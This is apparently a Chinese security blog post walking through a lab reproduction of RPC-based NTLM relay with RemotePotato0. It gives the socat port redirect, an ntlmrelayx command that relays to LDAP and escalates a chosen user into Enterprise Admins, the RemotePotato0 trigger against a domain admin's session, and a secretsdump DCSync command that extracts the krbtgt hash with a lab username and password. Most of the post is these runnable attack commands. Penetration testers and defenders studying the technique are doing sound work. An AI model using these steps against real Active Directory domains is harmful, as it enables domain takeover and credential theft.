#  复现RPC中继NTLM身份验证   
原创 relaysec  Relay学安全   2023-12-10 23:45  
  
滥用 DCOM 激活服务的方法，即解组IStorage对象并将 NTLM 反射回本地 RPC TCP 端点以实现本地权限提升。虽然此漏洞已被修补，但 DCOM 激活服务曾经（现在仍然是）用于 RPC 身份验证的有效触发器。  
  
复现环境:  
  
DC: 10.10.10.139  
  
受害者机器:10.10.10.140  
  
攻击机:10.10.10.178  
  
首先查看用户的会话 可以看到这里有域管的一个会话 可以看他的会话ID为1  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mqibyWPhHc5mcmJuoVXrH2j6IicsQIedU5wAcgbxjw8yiaVZkVibeqjCICWL8TMP1Yt7Sf2yxIliaIZckw/640?wx_fmt=png&from=appmsg "")  
  
然后我们到攻击机进行重定向转发  
  
需要您在vps上重定向转发 sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:(目标机器):9997 &  
  
sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:10.10.10.124:9997 &  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mqibyWPhHc5mcmJuoVXrH2j6GBoooNGZibeWhNj9icGmDId2X8D1YU3xUB9ojU8PhGgzhibIDz4wCCAmQ/640?wx_fmt=png&from=appmsg "")  
  
进行Ntlm中继监听  
  
python3 ntlmrelayx.py -t ldap://10.10.10.139 --no-wcf-server --escalate-user win2016  这里中继到ldap --escalate-user 这个参数是你要提升权限的用户  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mqibyWPhHc5mcmJuoVXrH2j6C9ZYyYPEVjibUodX5ibwLtC9jvgZsJbv1pbkXickxk8uKxxZH5BKBlElA/640?wx_fmt=png&from=appmsg "")  
  
接着我们去受害机器触发  
  
.\RemotePotato0.exe -m 0 -r 10.10.10.178 -p 9998 -s 1  
  
这里-s 1 是会话ID为1的域管  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mqibyWPhHc5mcmJuoVXrH2j6mNKFs1UBwMSn9icSx4XuDOPMGALVwLfe9kNVQH3LzX8RGoomgpXBhsg/640?wx_fmt=png&from=appmsg "")  
  
接着来到攻击机  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mqibyWPhHc5mcmJuoVXrH2j6B6fn89Gbs91LCMiaJOYAXmMMQf3eyIJSpBwELBfHxLzoVcHY3ehjldA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mqibyWPhHc5mcmJuoVXrH2j6PEMlrDL4vLATR5ZTy1nZkyBc6Zgy2kIbWp4kiaEU2ELKwNQlbGwU1Sg/640?wx_fmt=png&from=appmsg "")  
  
可以看到这里已经权限提升成功了 此时win2016这个域用户 就拥有了企业管理员的权限 我们回到受害机可以看到 已经在Enterprise Admins组里面了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mqibyWPhHc5mcmJuoVXrH2j6wEZ780UKwRrt6QSXYdvPC3qX6FcJLJtWmWcGAjYvvZKdkbQBMncHibg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mqibyWPhHc5mcmJuoVXrH2j6Hwb3NcbHBI0kt9sC9sPFbygVmzKalyibPEGcwhgIxwQhrVnCwA5ibK0w/640?wx_fmt=png&from=appmsg "")  
  
dc上也可以看到 这里已经添加成功了  
  
此时我们就可以dcsync了  
```
 python3 secretsdump.py Rt/win2016:Admin123..@10.10.10.139 -dc-ip 10.10.10.139 -just-dc-user krbtgt
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mqibyWPhHc5mcmJuoVXrH2j6ERQ29FNV3CUmialawOXVXSwPqadWg8RBGUicBKwkzHhsibibY4Kt56P83g/640?wx_fmt=png&from=appmsg "")  
  
  
